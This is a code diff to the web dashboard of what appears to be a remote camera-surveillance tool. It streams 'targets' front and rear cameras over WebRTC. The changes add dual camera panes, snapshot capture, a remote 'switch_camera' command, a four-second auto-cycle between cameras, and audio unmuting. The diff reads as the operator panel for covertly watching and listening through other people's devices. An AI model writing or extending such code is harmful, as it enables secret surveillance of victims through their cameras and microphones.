@@ -502,23 +502,37 @@
                 <div class="target-card-header">
                     <div class="target-id">
                         <span class="dot"></span>
-                        TARGET [${targetId}] &bull; DUAL LIVE CAMERAS
+                        TARGET [${targetId}] &bull; DUAL CAMERAS
                     </div>
                     <span class="target-status-badge" id="badge-${targetId}">CONNECTING</span>
                 </div>
-                <div class="target-video-wrapper" style="position: relative; background: #000; width: 100%; aspect-ratio: 16 / 9;">
-                    <video id="video-${targetId}" autoplay playsinline muted style="width: 100%; height: 100%; object-fit: contain; background: #000;"></video>
-                    <div class="video-overlay-loader" id="loader-${targetId}">
-                        <div class="dot" style="animation-duration: 0.8s;"></div>
-                        <span>Synchronizing Dual Camera Feeds...</span>
+                
+                <div class="target-dual-grid" id="dualGrid-${targetId}">
+                    <!-- Front Camera Window -->
+                    <div class="camera-pane" id="pane-front-${targetId}" onclick="switchCamera('${targetId}', 'user')" style="cursor: pointer;">
+                        <div class="camera-tag"><span class="dot" id="dot-front-${targetId}"></span> FRONT CAM <span id="label-front-${targetId}" style="color: var(--accent-cyan); font-size: 0.68rem;">(LIVE)</span></div>
+                        <video id="video-front-${targetId}" autoplay playsinline muted></video>
+                        <canvas id="canvas-front-${targetId}" style="display: none; width: 100%; height: 100%; object-fit: cover;"></canvas>
+                        <div class="video-overlay-loader" id="loader-${targetId}">
+                            <div class="dot" style="animation-duration: 0.8s;"></div>
+                            <span>Connecting Streams...</span>
+                        </div>
+                    </div>
+
+                    <!-- Rear Camera Window -->
+                    <div class="camera-pane" id="pane-rear-${targetId}" onclick="switchCamera('${targetId}', 'environment')" style="cursor: pointer;">
+                        <div class="camera-tag"><span class="dot" id="dot-rear-${targetId}" style="background: #94a3b8; box-shadow: none;"></span> REAR CAM <span id="label-rear-${targetId}" style="color: #94a3b8; font-size: 0.68rem;">(CLICK TO ACTIVATE)</span></div>
+                        <video id="video-rear-${targetId}" autoplay playsinline muted style="display: none;"></video>
+                        <canvas id="canvas-rear-${targetId}" style="width: 100%; height: 100%; object-fit: cover;"></canvas>
                     </div>
                 </div>
+
                 <div class="target-card-footer">
-                    <span id="time-${targetId}">Dual Feed Active</span>
+                    <span id="time-${targetId}">Both Cameras Ready</span>
                     <div style="display: flex; gap: 8px; flex-wrap: wrap;">
-                        <button class="btn-action" id="camBtn-${targetId}" onclick="switchCamera('${targetId}')">📷 Switch Active Sensor</button>
+                        <button class="btn-action" id="camBtn-${targetId}" onclick="toggleActiveCamera('${targetId}')">📷 Switch to Rear</button>
+                        <button class="btn-action" id="cycleBtn-${targetId}" onclick="toggleAutoCycle('${targetId}')">🔄 Auto-Cycle: OFF</button>
                         <button class="btn-action" onclick="requestTargetOffer('${targetId}')">Reconnect</button>
-                        <button class="btn-action" id="zoomBtn-${targetId}" onclick="toggleZoom('${targetId}')">Zoom: Out</button>
                         <button class="btn-action" id="muteBtn-${targetId}" onclick="toggleMute('${targetId}')">Unmute Audio</button>
                         <button class="btn-action" onclick="fullscreenVideo('${targetId}')">Fullscreen</button>
                     </div>
@@ -526,32 +540,52 @@
             `;
             grid.appendChild(card);
 
-            const videoEl = card.querySelector(`#video-${targetId}`);
+            const videoFront = card.querySelector(`#video-front-${targetId}`);
+            const videoRear = card.querySelector(`#video-rear-${targetId}`);
+            const canvasFront = card.querySelector(`#canvas-front-${targetId}`);
+            const canvasRear = card.querySelector(`#canvas-rear-${targetId}`);
             const loaderEl = card.querySelector(`#loader-${targetId}`);
             const badgeEl = card.querySelector(`#badge-${targetId}`);
 
-            // Ensure video element plays muted initially for browser autoplay policies
-            videoEl.muted = true;
+            videoFront.muted = true;
+            videoRear.muted = true;
 
             session = {
                 pc: null,
                 pendingIce: [],
                 cardEl: card,
-                videoEl,
+                videoEl: videoFront,
+                videoFront,
+                videoRear,
+                canvasFront,
+                canvasRear,
                 loaderEl,
                 badgeEl,
-                activeCamera: 'user'
+                activeCamera: 'user',
+                cycleInterval: null
             };
             targets.set(targetId, session);
             updateTargetCount();
             return session;
         }
 
-        function switchCamera(targetId) {
+        function toggleActiveCamera(targetId) {
             const session = targets.get(targetId);
-            const nextCam = (session && session.activeCamera === 'environment') ? 'user' : 'environment';
+            const targetCam = (session && session.activeCamera === 'environment') ? 'user' : 'environment';
+            switchCamera(targetId, targetCam);
+        }
+
+        function switchCamera(targetId, specificMode) {
+            const session = targets.get(targetId);
+            if (!session) return;
+
+            const nextCam = specificMode || (session.activeCamera === 'environment' ? 'user' : 'environment');
             const btn = document.getElementById(`camBtn-${targetId}`);
             if (btn) btn.innerText = "📷 Switching...";
+
+            // Snapshot current active video into canvas before switching
+            captureSnapshot(session);
+
             if (ws && ws.readyState === WebSocket.OPEN) {
                 console.log(`[*] Sending switch_camera to target ${targetId}: ${nextCam}`);
                 ws.send(JSON.stringify({
@@ -559,6 +593,90 @@
                     type: "switch_camera",
                     camera: nextCam
                 }));
+            }
+        }
+
+        function captureSnapshot(session) {
+            try {
+                if (session.activeCamera === 'user' && session.videoFront && session.canvasFront) {
+                    const ctx = session.canvasFront.getContext('2d');
+                    session.canvasFront.width = session.videoFront.videoWidth || 640;
+                    session.canvasFront.height = session.videoFront.videoHeight || 480;
+                    ctx.drawImage(session.videoFront, 0, 0, session.canvasFront.width, session.canvasFront.height);
+                } else if (session.activeCamera === 'environment' && session.videoRear && session.canvasRear) {
+                    const ctx = session.canvasRear.getContext('2d');
+                    session.canvasRear.width = session.videoRear.videoWidth || 640;
+                    session.canvasRear.height = session.videoRear.videoHeight || 480;
+                    ctx.drawImage(session.videoRear, 0, 0, session.canvasRear.width, session.canvasRear.height);
+                }
+            } catch (e) {}
+        }
+
+        function toggleAutoCycle(targetId) {
+            const session = targets.get(targetId);
+            if (!session) return;
+
+            const btn = document.getElementById(`cycleBtn-${targetId}`);
+            if (session.cycleInterval) {
+                clearInterval(session.cycleInterval);
+                session.cycleInterval = null;
+                if (btn) {
+                    btn.innerText = "🔄 Auto-Cycle: OFF";
+                    btn.classList.remove('active');
+                }
+            } else {
+                if (btn) {
+                    btn.innerText = "🔄 Auto-Cycle: ON (4s)";
+                    btn.classList.add('active');
+                }
+                session.cycleInterval = setInterval(() => {
+                    toggleActiveCamera(targetId);
+                }, 4000);
+            }
+        }
+
+        function updateCameraUI(targetId, activeCam) {
+            const session = targets.get(targetId);
+            if (!session) return;
+
+            session.activeCamera = activeCam;
+            const btn = document.getElementById(`camBtn-${targetId}`);
+            const dotFront = document.getElementById(`dot-front-${targetId}`);
+            const dotRear = document.getElementById(`dot-rear-${targetId}`);
+            const labelFront = document.getElementById(`label-front-${targetId}`);
+            const labelRear = document.getElementById(`label-rear-${targetId}`);
+
+            if (activeCam === 'environment') {
+                if (btn) btn.innerText = "📷 Switch to Front";
+                if (dotFront) { dotFront.style.background = "#94a3b8"; dotFront.style.boxShadow = "none"; }
+                if (dotRear) { dotRear.style.background = "#10b981"; dotRear.style.boxShadow = "0 0 8px #10b981"; }
+                if (labelFront) { labelFront.innerText = "(LAST SNAPSHOT)"; labelFront.style.color = "#94a3b8"; }
+                if (labelRear) { labelRear.innerText = "(LIVE STREAM)"; labelRear.style.color = "#10b981"; }
+
+                if (session.canvasFront) session.canvasFront.style.display = "block";
+                if (session.videoFront) session.videoFront.style.display = "none";
+
+                if (session.canvasRear) session.canvasRear.style.display = "none";
+                if (session.videoRear) {
+                    session.videoRear.style.display = "block";
+                    session.videoRear.srcObject = session.videoFront.srcObject;
+                    session.videoRear.play().catch(() => {});
+                }
+            } else {
+                if (btn) btn.innerText = "📷 Switch to Rear";
+                if (dotFront) { dotFront.style.background = "#00f2fe"; dotFront.style.boxShadow = "0 0 8px #00f2fe"; }
+                if (dotRear) { dotRear.style.background = "#94a3b8"; dotRear.style.boxShadow = "none"; }
+                if (labelFront) { labelFront.innerText = "(LIVE STREAM)"; labelFront.style.color = "#00f2fe"; }
+                if (labelRear) { labelRear.innerText = "(LAST SNAPSHOT)"; labelRear.style.color = "#94a3b8"; }
+
+                if (session.canvasRear) session.canvasRear.style.display = "block";
+                if (session.videoRear) session.videoRear.style.display = "none";
+
+                if (session.canvasFront) session.canvasFront.style.display = "none";
+                if (session.videoFront) {
+                    session.videoFront.style.display = "block";
+                    session.videoFront.play().catch(() => {});
+                }
             }
         }
 
@@ -626,12 +744,7 @@
                         console.log("[-] Target left:", msg.targetId);
                         removeTargetSession(msg.targetId);
                     } else if (msg.type === "camera_info" && msg.targetId) {
-                        const session = ensureTargetSession(msg.targetId);
-                        session.activeCamera = msg.camera;
-                        const btn = document.getElementById(`camBtn-${msg.targetId}`);
-                        if (btn) {
-                            btn.innerText = msg.camera === 'environment' ? "📷 Cam: Rear (Switch)" : "📷 Cam: Front (Switch)";
-                        }
+                        updateCameraUI(msg.targetId, msg.camera);
                     } else if (msg.type === "offer" && msg.targetId) {
                         console.log("[+] Received offer from target:", msg.targetId);
                         await handleTargetOffer(msg.targetId, msg.data);
@@ -686,21 +799,20 @@
 
             pc.ontrack = (event) => {
                 console.log(`[+] Track received from target ${targetId}:`, event.track.kind);
-                if (event.streams && event.streams[0]) {
-                    session.videoEl.srcObject = event.streams[0];
-                } else {
-                    let inbound = session.videoEl.srcObject;
-                    if (!inbound || !(inbound instanceof MediaStream)) {
-                        inbound = new MediaStream();
-                        session.videoEl.srcObject = inbound;
-                    }
-                    inbound.addTrack(event.track);
+                const stream = (event.streams && event.streams[0]) ? event.streams[0] : new MediaStream([event.track]);
+                
+                if (session.videoFront) {
+                    session.videoFront.srcObject = stream;
+                    session.videoFront.play().catch(() => {});
+                }
+                if (session.videoRear) {
+                    session.videoRear.srcObject = stream;
+                    session.videoRear.play().catch(() => {});
                 }
 
                 session.loaderEl.style.display = 'none';
                 session.badgeEl.innerText = 'LIVE STREAMING';
                 session.badgeEl.style.color = '#10b981';
-                session.videoEl.play().catch(e => console.log('Video play policy info:', e));
             };
 
             pc.onicecandidate = (event) => {
